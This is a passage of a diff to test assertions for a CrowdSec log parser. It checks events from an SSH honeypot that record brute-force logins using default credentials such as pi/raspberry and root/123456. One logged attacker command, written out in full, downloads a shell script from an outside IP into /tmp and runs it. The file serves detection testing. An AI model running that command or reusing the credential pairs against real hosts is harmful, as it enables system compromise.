@@ -1,86 +1,686 @@
 len(results) == 4
-len(results["s00-raw"]["crowdsecurity/non-syslog"]) == 16
+len(results["s00-raw"]["crowdsecurity/non-syslog"]) == 136
 results["s00-raw"]["crowdsecurity/non-syslog"][0].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][0].Evt.Parsed["message"] == "WARNING 2022/04/16 21:58:13 Failed to establish SSH connection: EOF"
 results["s00-raw"]["crowdsecurity/non-syslog"][0].Evt.Parsed["program"] == "sshesame"
-results["s00-raw"]["crowdsecurity/non-syslog"][0].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][0].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] authentication for user \"admin\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][0].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][0].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][1].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][1].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] authentication for user \"fangdan\" with password \"fangdan123\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][1].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58960] authentication for user \"2\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][1].Evt.Parsed["program"] == "sshesame"
 results["s00-raw"]["crowdsecurity/non-syslog"][1].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][1].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][2].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][2].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58710] authentication for user \"admin\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][2].Evt.Parsed["program"] == "sshesame"
-results["s00-raw"]["crowdsecurity/non-syslog"][2].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] connection with client version \"SSH-2.0-libssh-0.6.3\" established"
 results["s00-raw"]["crowdsecurity/non-syslog"][2].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][2].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][3].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][3].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] authentication for user \"nproc\" with password \"nproc\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][3].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58714] authentication for user \"1234\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][3].Evt.Parsed["program"] == "sshesame"
 results["s00-raw"]["crowdsecurity/non-syslog"][3].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][3].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][4].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][4].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] connection with client version \"SSH-2.0-libssh-0.6.3\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][4].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59062] authentication for user \"cisco\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][4].Evt.Parsed["program"] == "sshesame"
-results["s00-raw"]["crowdsecurity/non-syslog"][4].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][4].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][4].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][5].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][5].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51670] [channel 0] session requested"
 results["s00-raw"]["crowdsecurity/non-syslog"][5].Evt.Parsed["program"] == "sshesame"
-results["s00-raw"]["crowdsecurity/non-syslog"][5].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][5].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58862] authentication for user \"admin\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][5].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][5].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][6].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][6].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][6].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58738] authentication for user \"support\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][6].Evt.Parsed["program"] == "sshesame"
 results["s00-raw"]["crowdsecurity/non-syslog"][6].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][6].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][7].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][7].Evt.Parsed["message"] == "2022/04/16 22:00:04 [164.77.39.94:51670] [channel 0] closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][7].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58820] authentication for user \"root\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][7].Evt.Parsed["program"] == "sshesame"
 results["s00-raw"]["crowdsecurity/non-syslog"][7].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][7].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][8].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][8].Evt.Parsed["message"] == "2022/04/16 22:00:04 [164.77.39.94:51670] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][8].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] authentication for user \"admin\" with password \"123\" accepted"
 results["s00-raw"]["crowdsecurity/non-syslog"][8].Evt.Parsed["program"] == "sshesame"
 results["s00-raw"]["crowdsecurity/non-syslog"][8].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][8].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][9].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][9].Evt.Parsed["message"] == "WARNING 2022/04/16 22:02:34 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][9].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] connection with client version \"SSH-2.0-Go\" established"
 results["s00-raw"]["crowdsecurity/non-syslog"][9].Evt.Parsed["program"] == "sshesame"
 results["s00-raw"]["crowdsecurity/non-syslog"][9].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][9].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][10].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][10].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] authentication for user \"admin\" with password \"admin1234\" accepted"
 results["s00-raw"]["crowdsecurity/non-syslog"][10].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][10].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58960] authentication for user \"2\" with password \"2\" accepted"
 results["s00-raw"]["crowdsecurity/non-syslog"][10].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][10].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][11].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][11].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] connection with client version \"SSH-2.0-Go\" established"
 results["s00-raw"]["crowdsecurity/non-syslog"][11].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][11].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58960] connection with client version \"SSH-2.0-Go\" established"
 results["s00-raw"]["crowdsecurity/non-syslog"][11].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][11].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][12].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][12].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58710] authentication for user \"admin\" with password \"1234\" accepted"
 results["s00-raw"]["crowdsecurity/non-syslog"][12].Evt.Parsed["program"] == "sshesame"
-results["s00-raw"]["crowdsecurity/non-syslog"][12].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58704] authentication for user \"ubnt\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][12].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][12].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][13].Success == true
-results["s00-raw"]["crowdsecurity/non-syslog"][13].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58998] authentication for user \"pi\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][13].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58710] connection with client version \"SSH-2.0-Go\" established"
 results["s00-raw"]["crowdsecurity/non-syslog"][13].Evt.Parsed["program"] == "sshesame"
 results["s00-raw"]["crowdsecurity/non-syslog"][13].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][13].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][14].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][14].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58932] authentication for user \"test\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][14].Evt.Parsed["program"] == "sshesame"
-results["s00-raw"]["crowdsecurity/non-syslog"][14].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59228] authentication for user \"ubuntu\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][14].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][14].Evt.Meta["datasource_type"] == "file"
 results["s00-raw"]["crowdsecurity/non-syslog"][15].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][15].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58750] authentication for user \"user\" without credentials rejected"
 results["s00-raw"]["crowdsecurity/non-syslog"][15].Evt.Parsed["program"] == "sshesame"
-results["s00-raw"]["crowdsecurity/non-syslog"][15].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] command \"cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh\" requested"
 results["s00-raw"]["crowdsecurity/non-syslog"][15].Evt.Meta["datasource_path"] == "sshesame.log"
 results["s00-raw"]["crowdsecurity/non-syslog"][15].Evt.Meta["datasource_type"] == "file"
-len(results["s00-raw"]["crowdsecurity/syslog-logs"]) == 16
+results["s00-raw"]["crowdsecurity/non-syslog"][16].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][16].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58714] authentication for user \"1234\" with password \"1234\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][16].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][16].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][16].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][17].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][17].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58714] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][17].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][17].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][17].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][18].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][18].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][18].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59062] authentication for user \"cisco\" with password \"cisco\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][18].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][18].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][19].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][19].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59062] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][19].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][19].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][19].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][20].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][20].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58862] authentication for user \"admin\" with password \"password\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][20].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][20].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][20].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][21].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][21].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58862] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][21].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][21].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][21].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][22].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][22].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58738] authentication for user \"support\" with password \"support\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][22].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][22].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][22].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][23].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][23].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58738] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][23].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][23].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][23].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][24].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][24].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] authentication for user \"admin\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][24].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][24].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][24].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][25].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][25].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] session requested"
+results["s00-raw"]["crowdsecurity/non-syslog"][25].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][25].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][25].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][26].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][26].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58932] authentication for user \"test\" with password \"test\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][26].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][26].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][26].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][27].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][27].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58932] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][27].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][27].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][27].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][28].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][28].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58750] authentication for user \"user\" with password \"user\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][28].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][28].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][28].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][29].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][29].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58750] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][29].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][29].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][29].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][30].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][30].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] PTY using terminal \"xterm\" (size 40x80) requested"
+results["s00-raw"]["crowdsecurity/non-syslog"][30].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][30].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][30].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][31].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][31].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] authentication for user \"admin\" with password \"admin1234\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][31].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][31].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][31].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][32].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][32].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59078] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][32].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][32].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][32].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][33].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][33].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58704] authentication for user \"ubnt\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][33].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][33].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][33].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][34].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][34].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58998] authentication for user \"pi\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][34].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][34].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][34].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][35].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][35].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59228] authentication for user \"ubuntu\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][35].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][35].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][35].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][36].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][36].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59114] [channel 0] command \"cd /tmp; rm -rf wget*; curl -O http://45.95.55.24/wget.sh; wget http://45.95.55.24/wget.sh; chmod 777 wget.sh; ./wget.sh\" requested"
+results["s00-raw"]["crowdsecurity/non-syslog"][36].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][36].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][36].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][37].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][37].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58836] authentication for user \"daemon\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][37].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][37].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][37].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][38].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][38].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58820] authentication for user \"root\" with password \"123456\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][38].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][38].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][38].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][39].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][39].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58820] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][39].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][39].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][39].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][40].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][40].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58704] authentication for user \"ubnt\" with password \"ubnt\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][40].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][40].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][40].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][41].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][41].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58704] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][41].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][41].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][41].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][42].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][42].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58998] authentication for user \"pi\" with password \"raspberry\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][42].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][42].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][42].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][43].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][43].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58998] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][43].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][43].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][43].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][44].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][44].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58776] authentication for user \"guest\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][44].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][44].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][44].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][45].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][45].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59228] authentication for user \"ubuntu\" with password \"ubuntu\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][45].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][45].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][45].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][46].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][46].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][46].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59228] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][46].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][46].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][47].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][47].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59134] authentication for user \"minecraft\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][47].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][47].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][47].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][48].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][48].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58836] authentication for user \"daemon\" with password \"daemon\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][48].Evt.Parsed["program"] == "sshesame"
